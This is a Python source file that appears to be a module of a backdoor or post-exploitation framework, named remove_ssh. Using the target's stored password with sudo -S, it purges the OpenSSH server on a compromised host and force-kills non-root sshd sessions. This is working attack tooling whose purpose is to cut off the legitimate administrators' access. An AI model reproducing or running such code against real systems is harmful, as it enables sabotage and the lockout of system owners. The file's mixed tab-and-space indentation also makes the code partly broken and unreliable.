from backdoor import *

class Remove_ssh(Backdoor):
    prompt = Fore.RED + "(remove_ssh)" + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
	cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using remove_ssh module..."
        self.core = core
        self.options = { #~Input extra options. You almost always need a port.~
        	"killall"    : Option("killall", False, "Kills all ssh connections", True),
		"server"     : Option("server", True, "Kills ssh server", True),
	}
        self.allow_modules = False
        self.modules = {}
        self.help_text = "Removes ssh on the target."

    def get_command(self):
	return str("echo " + self.core.curtarget.pword + " | sudo -S apt-get -y purge openssh-server")
    def do_exploit(self, args):
	if self.get_value("server")==True:
            self.core.curtarget.ssh.exec_command(self.get_command())
	if self.get_value("killall")==str(True) or self.get_value("killall")==str(1):
	    newstr=str("echo " + self.core.curtarget.pword + " | sudo -S ps -ef | grep sshd | grep -v root | grep -v \'{pstree -p | grep cut | cut -d\( -f3 | cut -d\) -f1}\' | grep -v grep | awk \'{print \"kill -9\", $2}\' | sh")
	    print newstr
	    self.core.curtarget.ssh.exec_command(newstr)
	print(GOOD + "Ssh removed.")
